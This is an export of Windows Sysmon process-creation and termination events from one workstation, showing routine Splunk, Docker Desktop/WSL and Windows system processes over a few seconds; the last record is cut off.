Information,2023/04/02 17:41:35,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: -
UtcTime: 2023-04-02 08:41:35.844
ProcessGuid: {22a2695c-3fbf-6429-c9e6-000000006e00}
ProcessId: 9980
Image: C:\Program Files\Splunk\bin\splunk-admon.exe
FileVersion: 9.0.4.1
Description: Active Directory monitor
Product: splunk Application
Company: Splunk Inc.
OriginalFileName: splunk-admon.exe
CommandLine: ""C:\Program Files\Splunk\bin\splunk-admon.exe""
CurrentDirectory: C:\WINDOWS\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {22a2695c-0147-6428-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA256=149C523C36681F5EBEA5325F1000844BD1F580E024F154D7583CD501D4AA5F40
ParentProcessGuid: {00000000-0000-0000-0000-000000000000}
ParentProcessId: 4840
ParentImage: -
ParentCommandLine: -
ParentUser: -"
Information,2023/04/02 17:41:35,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: -
UtcTime: 2023-04-02 08:41:35.796
ProcessGuid: {22a2695c-3fbf-6429-c8e6-000000006e00}
ProcessId: 8860
Image: C:\Program Files\Splunk\bin\splunk-powershell.exe
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
CommandLine: ""C:\Program Files\Splunk\bin\splunk-powershell.exe""
CurrentDirectory: C:\WINDOWS\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {22a2695c-0147-6428-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA256=3C1E97C6D51A12D6310DEFB06811DB046488A6FF04D986D65C38297ACF050995
ParentProcessGuid: {00000000-0000-0000-0000-000000000000}
ParentProcessId: 4840
ParentImage: -
ParentCommandLine: -
ParentUser: -"
Information,2023/04/02 17:41:35,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
RuleName: -
UtcTime: 2023-04-02 08:41:35.724
ProcessGuid: {22a2695c-3fbf-6429-c7e6-000000006e00}
ProcessId: 9508
Image: C:\Program Files\Splunk\bin\splunk-optimize.exe
User: NT AUTHORITY\SYSTEM"
Information,2023/04/02 17:41:35,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: -
UtcTime: 2023-04-02 08:41:35.711
ProcessGuid: {22a2695c-3fbf-6429-c7e6-000000006e00}
ProcessId: 9508
Image: C:\Program Files\Splunk\bin\splunk-optimize.exe
FileVersion: 9.0.4.1
Description: splunk-optimize
Product: splunk Application
Company: Splunk Inc.
OriginalFileName: splunk-optimize.exe
CommandLine: splunk-optimize -d ""C:\Program Files\Splunk\var\lib\splunk\_introspection\db\hot_v1_1"" -x 18014321152 --log-to--splunkd-log --write-level 3 --tsidx-target-size 1572864000 --msidx-comp-block-size 1024
CurrentDirectory: C:\WINDOWS\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {22a2695c-0147-6428-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA256=090AB6E27522C5B37069983CDBB2F55248153A3FD9602DF223134ACBD59FD742
ParentProcessGuid: {00000000-0000-0000-0000-000000000000}
ParentProcessId: 4840
ParentImage: -
ParentCommandLine: -
ParentUser: -"
Information,2023/04/02 17:41:35,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
RuleName: -
UtcTime: 2023-04-02 08:41:35.705
ProcessGuid: {22a2695c-3fbf-6429-c3e6-000000006e00}
ProcessId: 26612
Image: C:\Windows\System32\conhost.exe
User: DESKTOP-61BPDT0\iniad"
Information,2023/04/02 17:41:35,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
RuleName: -
UtcTime: 2023-04-02 08:41:35.702
ProcessGuid: {22a2695c-3fbf-6429-c6e6-000000006e00}
ProcessId: 16472
Image: C:\Program Files\Splunk\bin\splunk-optimize.exe
User: NT AUTHORITY\SYSTEM"
Information,2023/04/02 17:41:35,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
RuleName: -
UtcTime: 2023-04-02 08:41:35.700
ProcessGuid: {22a2695c-3fbf-6429-c2e6-000000006e00}
ProcessId: 20188
Image: C:\Windows\System32\lxss\wslhost.exe
User: DESKTOP-61BPDT0\iniad"
Information,2023/04/02 17:41:35,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: -
UtcTime: 2023-04-02 08:41:35.690
ProcessGuid: {22a2695c-3fbf-6429-c6e6-000000006e00}
ProcessId: 16472
Image: C:\Program Files\Splunk\bin\splunk-optimize.exe
FileVersion: 9.0.4.1
Description: splunk-optimize
Product: splunk Application
Company: Splunk Inc.
OriginalFileName: splunk-optimize.exe
CommandLine: splunk-optimize -d ""C:\Program Files\Splunk\var\lib\splunk\_internaldb\db\hot_v1_1"" -x 18014321152 --log-to--splunkd-log --write-level 3 --tsidx-target-size 1572864000 --msidx-comp-block-size 1024
CurrentDirectory: C:\WINDOWS\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {22a2695c-0147-6428-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA256=090AB6E27522C5B37069983CDBB2F55248153A3FD9602DF223134ACBD59FD742
ParentProcessGuid: {00000000-0000-0000-0000-000000000000}
ParentProcessId: 4840
ParentImage: -
ParentCommandLine: -
ParentUser: -"
Information,2023/04/02 17:41:35,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
RuleName: -
UtcTime: 2023-04-02 08:41:35.690
ProcessGuid: {22a2695c-3fbf-6429-bfe6-000000006e00}
ProcessId: 27068
Image: C:\Windows\System32\wsl.exe
User: DESKTOP-61BPDT0\iniad"
Information,2023/04/02 17:41:35,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: -
UtcTime: 2023-04-02 08:41:35.623
ProcessGuid: {22a2695c-3fbf-6429-c5e6-000000006e00}
ProcessId: 15924
Image: C:\Program Files\Splunk\bin\splunkd.exe
FileVersion: 9.0.4.1
Description: splunkd service
Product: splunk Application
Company: Splunk Inc.
OriginalFileName: splunkd.exe
CommandLine: ""C:\Program Files\Splunk\bin\SplunkD.EXE"" btool server list
CurrentDirectory: C:\WINDOWS\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {22a2695c-0147-6428-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA256=DDC68D8B83CE3833A4DCCCD17EAD4CF9D0517B64BFC681EA7C74108EF606C3E4
ParentProcessGuid: {22a2695c-3fbf-6429-c4e6-000000006e00}
ParentProcessId: 16752
ParentImage: C:\Program Files\Splunk\bin\btool.exe
ParentCommandLine: btool server list
ParentUser: NT AUTHORITY\SYSTEM"
Information,2023/04/02 17:41:35,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: -
UtcTime: 2023-04-02 08:41:35.610
ProcessGuid: {22a2695c-3fbf-6429-c4e6-000000006e00}
ProcessId: 16752
Image: C:\Program Files\Splunk\bin\btool.exe
FileVersion: 9.0.4.1
Description: btool
Product: splunk Application
Company: Splunk Inc.
OriginalFileName: btool.exe
CommandLine: btool server list
CurrentDirectory: C:\WINDOWS\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {22a2695c-0147-6428-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA256=84FDBDECB36A65AA09F3BB79E68C79C1571AC4F1A94056B2A24D42928A8083DB
ParentProcessGuid: {22a2695c-3fbe-6429-b8e6-000000006e00}
ParentProcessId: 21324
ParentImage: C:\Program Files\Splunk\bin\python3.exe
ParentCommandLine: ""C:\Program Files\Splunk\bin\Python3.exe"" ""C:\Program Files\Splunk\etc\apps\splunk_assist\bin\instance_id_modular_input.py""
ParentUser: NT AUTHORITY\SYSTEM"
Information,2023/04/02 17:41:35,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: -
UtcTime: 2023-04-02 08:41:35.587
ProcessGuid: {22a2695c-3fbf-6429-c3e6-000000006e00}
ProcessId: 26612
Image: C:\Windows\System32\conhost.exe
FileVersion: 10.0.19041.2546 (WinBuild.160101.0800)
Description: Console Window Host
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: CONHOST.EXE
CommandLine: \??\C:\WINDOWS\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\WINDOWS
User: DESKTOP-61BPDT0\iniad
LogonGuid: {22a2695c-014a-6428-81ce-030000000000}
LogonId: 0x3CE81
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA256=A26A1FFB81A61281FFA55CB7778CC3FB0FF981704DE49F75F51F18B283FBA7A2
ParentProcessGuid: {22a2695c-3fbf-6429-c2e6-000000006e00}
ParentProcessId: 20188
ParentImage: C:\Windows\System32\lxss\wslhost.exe
ParentCommandLine: C:\WINDOWS\system32\lxss\wslhost.exe {95147f4a-eee3-4770-bd10-0bb18962c0ea} 776 804 808 {1bd0db17-f179-4a8d-ab5a-afeaeb38f5d5}
ParentUser: DESKTOP-61BPDT0\iniad"
Information,2023/04/02 17:41:35,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: -
UtcTime: 2023-04-02 08:41:35.582
ProcessGuid: {22a2695c-3fbf-6429-c2e6-000000006e00}
ProcessId: 20188
Image: C:\Windows\System32\lxss\wslhost.exe
FileVersion: 10.0.19041.2311 (WinBuild.160101.0800)
Description: Microsoft Windows Subsystem for Linux Background Host
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: wslhost.exe
CommandLine: C:\WINDOWS\system32\lxss\wslhost.exe {95147f4a-eee3-4770-bd10-0bb18962c0ea} 776 804 808 {1bd0db17-f179-4a8d-ab5a-afeaeb38f5d5}
CurrentDirectory: C:\Users\iniad\AppData\Roaming\Docker\
User: DESKTOP-61BPDT0\iniad
LogonGuid: {22a2695c-014a-6428-81ce-030000000000}
LogonId: 0x3CE81
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA256=D9E607F64643812EDB102CE26AF0BB0E9BEB180E44F0F28F791941BF2208CA78
ParentProcessGuid: {22a2695c-3fbf-6429-bfe6-000000006e00}
ParentProcessId: 27068
ParentImage: C:\Windows\System32\wsl.exe
ParentCommandLine: C:\WINDOWS\system32\wsl.exe  -d docker-desktop cat /proc/stat
ParentUser: DESKTOP-61BPDT0\iniad"
Information,2023/04/02 17:41:35,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: -
UtcTime: 2023-04-02 08:41:35.577
ProcessGuid: {22a2695c-3fbf-6429-c1e6-000000006e00}
ProcessId: 27240
Image: C:\Program Files\Splunk\bin\splunkd.exe
FileVersion: 9.0.4.1
Description: splunkd service
Product: splunk Application
Company: Splunk Inc.
OriginalFileName: splunkd.exe
CommandLine: ""C:\Program Files\Splunk\bin\SplunkD.EXE"" btool server list
CurrentDirectory: C:\WINDOWS\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {22a2695c-0147-6428-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA256=DDC68D8B83CE3833A4DCCCD17EAD4CF9D0517B64BFC681EA7C74108EF606C3E4
ParentProcessGuid: {22a2695c-3fbf-6429-c0e6-000000006e00}
ParentProcessId: 8064
ParentImage: C:\Program Files\Splunk\bin\btool.exe
ParentCommandLine: btool server list
ParentUser: NT AUTHORITY\SYSTEM"
Information,2023/04/02 17:41:35,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: -
UtcTime: 2023-04-02 08:41:35.565
ProcessGuid: {22a2695c-3fbf-6429-c0e6-000000006e00}
ProcessId: 8064
Image: C:\Program Files\Splunk\bin\btool.exe
FileVersion: 9.0.4.1
Description: btool
Product: splunk Application
Company: Splunk Inc.
OriginalFileName: btool.exe
CommandLine: btool server list
CurrentDirectory: C:\WINDOWS\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {22a2695c-0147-6428-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA256=84FDBDECB36A65AA09F3BB79E68C79C1571AC4F1A94056B2A24D42928A8083DB
ParentProcessGuid: {22a2695c-3fbe-6429-b7e6-000000006e00}
ParentProcessId: 18776
ParentImage: C:\Program Files\Splunk\bin\python3.exe
ParentCommandLine: ""C:\Program Files\Splunk\bin\Python3.exe"" ""C:\Program Files\Splunk\etc\apps\splunk_assist\bin\supervisor_modular_input.py""
ParentUser: NT AUTHORITY\SYSTEM"
Information,2023/04/02 17:41:35,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
RuleName: -
UtcTime: 2023-04-02 08:41:35.543
ProcessGuid: {22a2695c-3fbf-6429-bce6-000000006e00}
ProcessId: 21512
Image: C:\Program Files\Splunk\bin\splunkd.exe
User: NT AUTHORITY\SYSTEM"
Information,2023/04/02 17:41:35,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: -
UtcTime: 2023-04-02 08:41:35.531
ProcessGuid: {22a2695c-3fbf-6429-bfe6-000000006e00}
ProcessId: 27068
Image: C:\Windows\System32\wsl.exe
FileVersion: 10.0.19041.2311 (WinBuild.160101.0800)
Description: Microsoft Windows Subsystem for Linux Launcher
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: wsl.exe
CommandLine: C:\WINDOWS\system32\wsl.exe  -d docker-desktop cat /proc/stat
CurrentDirectory: C:\Users\iniad\AppData\Roaming\Docker\
User: DESKTOP-61BPDT0\iniad
LogonGuid: {22a2695c-014a-6428-81ce-030000000000}
LogonId: 0x3CE81
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA256=070F414025D984C0799A616B459FEBC99EBC7B6F9D6C3B76E0D4E2E1F22266C2
ParentProcessGuid: {22a2695c-2190-6429-055d-000000006e00}
ParentProcessId: 16796
ParentImage: C:\Program Files\Docker\Docker\resources\com.docker.backend.exe
ParentCommandLine: ""C:\Program Files\Docker\Docker\resources\com.docker.backend.exe"" -addr unix:\\.\pipe\dockerBackendApiServer -native-api
ParentUser: DESKTOP-61BPDT0\iniad"
Information,2023/04/02 17:41:35,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: -
UtcTime: 2023-04-02 08:41:35.492
ProcessGuid: {22a2695c-3fbf-6429-bee6-000000006e00}
ProcessId: 22488
Image: C:\Program Files\Splunk\bin\splunkd.exe
FileVersion: 9.0.4.1
Description: splunkd service
Product: splunk Application
Company: Splunk Inc.
OriginalFileName: splunkd.exe
CommandLine: ""C:\Program Files\Splunk\bin\SplunkD.EXE"" btool server list
CurrentDirectory: C:\WINDOWS\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {22a2695c-0147-6428-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA256=DDC68D8B83CE3833A4DCCCD17EAD4CF9D0517B64BFC681EA7C74108EF606C3E4
ParentProcessGuid: {22a2695c-3fbf-6429-bde6-000000006e00}
ParentProcessId: 25820
ParentImage: C:\Program Files\Splunk\bin\btool.exe
ParentCommandLine: btool server list
ParentUser: NT AUTHORITY\SYSTEM"
Information,2023/04/02 17:41:35,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: -
UtcTime: 2023-04-02 08:41:35.482
ProcessGuid: {22a2695c-3fbf-6429-bde6-000000006e00}
ProcessId: 25820
Image: C:\Program Files\Splunk\bin\btool.exe
FileVersion: 9.0.4.1
Description: btool
Product: splunk Application
Company: Splunk Inc.
OriginalFileName: btool.exe
CommandLine: btool server list
CurrentDirectory: C:\WINDOWS\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {22a2695c-0147-6428-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA256=84FDBDECB36A65AA09F3BB79E68C79C1571AC4F1A94056B2A24D42928A8083DB
ParentProcessGuid: {22a2695c-3fbe-6429-b6e6-000000006e00}
ParentProcessId: 18788
ParentImage: C:\Program Files\Splunk\bin\python3.exe
ParentCommandLine: ""C:\Program Files\Splunk\bin\Python3.exe"" ""C:\Program Files\Splunk\etc\apps\splunk_assist\bin\uiassets_modular_input.py""
ParentUser: NT AUTHORITY\SYSTEM"
Information,2023/04/02 17:41:35,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
RuleName: -
UtcTime: 2023-04-02 08:41:35.454
ProcessGuid: {22a2695c-3fbf-6429-bbe6-000000006e00}
ProcessId: 20168
Image: C:\Program Files\Splunk\bin\splunkd.exe
User: NT AUTHORITY\SYSTEM"
Information,2023/04/02 17:41:35,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
RuleName: -
UtcTime: 2023-04-02 08:41:35.441
ProcessGuid: {22a2695c-3fbf-6429-bae6-000000006e00}
ProcessId: 22644
Image: C:\Program Files\Splunk\bin\splunkd.exe
User: NT AUTHORITY\SYSTEM"
Information,2023/04/02 17:41:35,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: -
UtcTime: 2023-04-02 08:41:35.251
ProcessGuid: {22a2695c-3fbf-6429-bce6-000000006e00}
ProcessId: 21512
Image: C:\Program Files\Splunk\bin\splunkd.exe
FileVersion: 9.0.4.1
Description: splunkd service
Product: splunk Application
Company: Splunk Inc.
OriginalFileName: splunkd.exe
CommandLine: ""C:\Program Files\Splunk\bin\splunkd"" local-rest-uri -p 8089
CurrentDirectory: C:\WINDOWS\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {22a2695c-0147-6428-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA256=DDC68D8B83CE3833A4DCCCD17EAD4CF9D0517B64BFC681EA7C74108EF606C3E4
ParentProcessGuid: {22a2695c-3fbe-6429-b7e6-000000006e00}
ParentProcessId: 18776
ParentImage: C:\Program Files\Splunk\bin\python3.exe
ParentCommandLine: ""C:\Program Files\Splunk\bin\Python3.exe"" ""C:\Program Files\Splunk\etc\apps\splunk_assist\bin\supervisor_modular_input.py""
ParentUser: NT AUTHORITY\SYSTEM"
Information,2023/04/02 17:41:35,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: -
UtcTime: 2023-04-02 08:41:35.174
ProcessGuid: {22a2695c-3fbf-6429-bbe6-000000006e00}
ProcessId: 20168
Image: C:\Program Files\Splunk\bin\splunkd.exe
FileVersion: 9.0.4.1
Description: splunkd service
Product: splunk Application
Company: Splunk Inc.
OriginalFileName: splunkd.exe
CommandLine: ""C:\Program Files\Splunk\bin\splunkd"" local-rest-uri -p 8089
CurrentDirectory: C:\WINDOWS\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {22a2695c-0147-6428-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA256=DDC68D8B83CE3833A4DCCCD17EAD4CF9D0517B64BFC681EA7C74108EF606C3E4
ParentProcessGuid: {22a2695c-3fbe-6429-b8e6-000000006e00}
ParentProcessId: 21324
ParentImage: C:\Program Files\Splunk\bin\python3.exe
ParentCommandLine: ""C:\Program Files\Splunk\bin\Python3.exe"" ""C:\Program Files\Splunk\etc\apps\splunk_assist\bin\instance_id_modular_input.py""
ParentUser: NT AUTHORITY\SYSTEM"
Information,2023/04/02 17:41:35,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: -
UtcTime: 2023-04-02 08:41:35.130
ProcessGuid: {22a2695c-3fbf-6429-bae6-000000006e00}
ProcessId: 22644
Image: C:\Program Files\Splunk\bin\splunkd.exe
FileVersion: 9.0.4.1
Description: splunkd service
Product: splunk Application
Company: Splunk Inc.
OriginalFileName: splunkd.exe
CommandLine: ""C:\Program Files\Splunk\bin\splunkd"" local-rest-uri -p 8089
CurrentDirectory: C:\WINDOWS\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {22a2695c-0147-6428-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA256=DDC68D8B83CE3833A4DCCCD17EAD4CF9D0517B64BFC681EA7C74108EF606C3E4
ParentProcessGuid: {22a2695c-3fbe-6429-b6e6-000000006e00}
ParentProcessId: 18788
ParentImage: C:\Program Files\Splunk\bin\python3.exe
ParentCommandLine: ""C:\Program Files\Splunk\bin\Python3.exe"" ""C:\Program Files\Splunk\etc\apps\splunk_assist\bin\uiassets_modular_input.py""
ParentUser: NT AUTHORITY\SYSTEM"
Information,2023/04/02 17:41:34,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: -
UtcTime: 2023-04-02 08:41:34.811
ProcessGuid: {22a2695c-3fbe-6429-b9e6-000000006e00}
ProcessId: 6960
Image: C:\Windows\System32\wbem\WmiPrvSE.exe
FileVersion: 10.0.19041.546 (WinBuild.160101.0800)
Description: WMI Provider Host
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Wmiprvse.exe
CommandLine: C:\WINDOWS\system32\wbem\wmiprvse.exe -secured -Embedding
CurrentDirectory: C:\WINDOWS\system32\
User: NT AUTHORITY\NETWORK SERVICE
LogonGuid: {22a2695c-0147-6428-e403-000000000000}
LogonId: 0x3E4
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA256=2198A7B58BCCB758036B969DDAE6CC2ECE07565E2659A7C541A313A0492231A3
ParentProcessGuid: {00000000-0000-0000-0000-000000000000}
ParentProcessId: 1148
ParentImage: -
ParentCommandLine: -
ParentUser: -"
Information,2023/04/02 17:41:34,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: -
UtcTime: 2023-04-02 08:41:34.706
ProcessGuid: {22a2695c-3fbe-6429-b8e6-000000006e00}
ProcessId: 21324
Image: C:\Program Files\Splunk\bin\python3.exe
FileVersion: 3.7.11
Description: Python
Product: Python
Company: Python Software Foundation
OriginalFileName: python.exe
CommandLine: ""C:\Program Files\Splunk\bin\Python3.exe"" ""C:\Program Files\Splunk\etc\apps\splunk_assist\bin\instance_id_modular_input.py""
CurrentDirectory: C:\WINDOWS\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {22a2695c-0147-6428-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA256=B89B21E387AE0C72F4443C172C2792048C5645CCCC7C7F2A296878D20DEB2ABF
ParentProcessGuid: {00000000-0000-0000-0000-000000000000}
ParentProcessId: 4840
ParentImage: -
ParentCommandLine: -
ParentUser: -"
Information,2023/04/02 17:41:34,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: -
UtcTime: 2023-04-02 08:41:34.643
ProcessGuid: {22a2695c-3fbe-6429-b7e6-000000006e00}
ProcessId: 18776
Image: C:\Program Files\Splunk\bin\python3.exe
FileVersion: 3.7.11
Description: Python
Product: Python
Company: Python Software Foundation
OriginalFileName: python.exe
CommandLine: ""C:\Program Files\Splunk\bin\Python3.exe"" ""C:\Program Files\Splunk\etc\apps\splunk_assist\bin\supervisor_modular_input.py""
CurrentDirectory: C:\WINDOWS\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {22a2695c-0147-6428-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA256=B89B21E387AE0C72F4443C172C2792048C5645CCCC7C7F2A296878D20DEB2ABF
ParentProcessGuid: {00000000-0000-0000-0000-000000000000}
ParentProcessId: 4840
ParentImage: -
ParentCommandLine: -
ParentUser: -"
Information,2023/04/02 17:41:34,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: -
UtcTime: 2023-04-02 08:41:34.580
ProcessGuid: {22a2695c-3fbe-6429-b6e6-000000006e00}
ProcessId: 18788
Image: C:\Program Files\Splunk\bin\python3.exe
FileVersion: 3.7.11
Description: Python
Product: Python
Company: Python Software Foundation
OriginalFileName: python.exe
CommandLine: ""C:\Program Files\Splunk\bin\Python3.exe"" ""C:\Program Files\Splunk\etc\apps\splunk_assist\bin\uiassets_modular_input.py""
CurrentDirectory: C:\WINDOWS\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {22a2695c-0147-6428-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA256=B89B21E387AE0C72F4443C172C2792048C5645CCCC7C7F2A296878D20DEB2ABF
ParentProcessGuid: {00000000-0000-0000-0000-000000000000}
ParentProcessId: 4840
ParentImage: -
ParentCommandLine: -
ParentUser: -"
Information,2023/04/02 17:41:34,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
RuleName: -
UtcTime: 2023-04-02 08:41:34.528
ProcessGuid: {22a2695c-3fbe-6429-b5e6-000000006e00}
ProcessId: 8264
Image: C:\Windows\System32\conhost.exe
User: DESKTOP-61BPDT0\iniad"
Information,2023/04/02 17:41:34,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
RuleName: -
UtcTime: 2023-04-02 08:41:34.525
ProcessGuid: {22a2695c-3fbe-6429-b4e6-000000006e00}
ProcessId: 20820
Image: C:\Windows\System32\lxss\wslhost.exe
User: DESKTOP-61BPDT0\iniad"
Information,2023/04/02 17:41:34,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
RuleName: -
UtcTime: 2023-04-02 08:41:34.517
ProcessGuid: {22a2695c-3fbe-6429-b3e6-000000006e00}
ProcessId: 16104
Image: C:\Windows\System32\wsl.exe
User: DESKTOP-61BPDT0\iniad"
Information,2023/04/02 17:41:34,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: -
UtcTime: 2023-04-02 08:41:34.439
ProcessGuid: {22a2695c-3fbe-6429-b5e6-000000006e00}
ProcessId: 8264
Image: C:\Windows\System32\conhost.exe
FileVersion: 10.0.19041.2546 (WinBuild.160101.0800)
Description: Console Window Host
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: CONHOST.EXE
CommandLine: \??\C:\WINDOWS\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\WINDOWS
User: DESKTOP-61BPDT0\iniad
LogonGuid: {22a2695c-014a-6428-81ce-030000000000}
LogonId: 0x3CE81
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA256=A26A1FFB81A61281FFA55CB7778CC3FB0FF981704DE49F75F51F18B283FBA7A2
ParentProcessGuid: {22a2695c-3fbe-6429-b4e6-000000006e00}
ParentProcessId: 20820
ParentImage: C:\Windows\System32\lxss\wslhost.exe
ParentCommandLine: C:\WINDOWS\system32\lxss\wslhost.exe {95147f4a-eee3-4770-bd10-0bb18962c0ea} 792 812 772 {1bd0db17-f179-4a8d-ab5a-afeaeb38f5d5}
ParentUser: DESKTOP-61BPDT0\iniad"
Information,2023/04/02 17:41:34,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: -
UtcTime: 2023-04-02 08:41:34.435
ProcessGuid: {22a2695c-3fbe-6429-b4e6-000000006e00}
ProcessId: 20820
Image: C:\Windows\System32\lxss\wslhost.exe
FileVersion: 10.0.19041.2311 (WinBuild.160101.0800)
Description: Microsoft Windows Subsystem for Linux Background Host
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: wslhost.exe
CommandLine: C:\WINDOWS\system32\lxss\wslhost.exe {95147f4a-eee3-4770-bd10-0bb18962c0ea} 792 812 772 {1bd0db17-f179-4a8d-ab5a-afeaeb38f5d5}
CurrentDirectory: C:\Users\iniad\AppData\Roaming\Docker\
User: DESKTOP-61BPDT0\iniad
LogonGuid: {22a2695c-014a-6428-81ce-030000000000}
LogonId: 0x3CE81
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA256=D9E607F64643812EDB102CE26AF0BB0E9BEB180E44F0F28F791941BF2208CA78
ParentProcessGuid: {22a2695c-3fbe-6429-b3e6-000000006e00}
ParentProcessId: 16104
ParentImage: C:\Windows\System32\wsl.exe
ParentCommandLine: C:\WINDOWS\system32\wsl.exe  -d docker-desktop cat /proc/stat
ParentUser: DESKTOP-61BPDT0\iniad"
Information,2023/04/02 17:41:34,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
RuleName: -
UtcTime: 2023-04-02 08:41:34.396
ProcessGuid: {22a2695c-3fbe-6429-b2e6-000000006e00}
ProcessId: 22452
Image: C:\Windows\System32\conhost.exe
User: DESKTOP-61BPDT0\iniad"
Information,2023/04/02 17:41:34,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
RuleName: -
UtcTime: 2023-04-02 08:41:34.393
ProcessGuid: {22a2695c-3fbe-6429-b1e6-000000006e00}
ProcessId: 12852
Image: C:\Windows\System32\lxss\wslhost.exe
User: DESKTOP-61BPDT0\iniad"
Information,2023/04/02 17:41:34,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: -
UtcTime: 2023-04-02 08:41:34.392
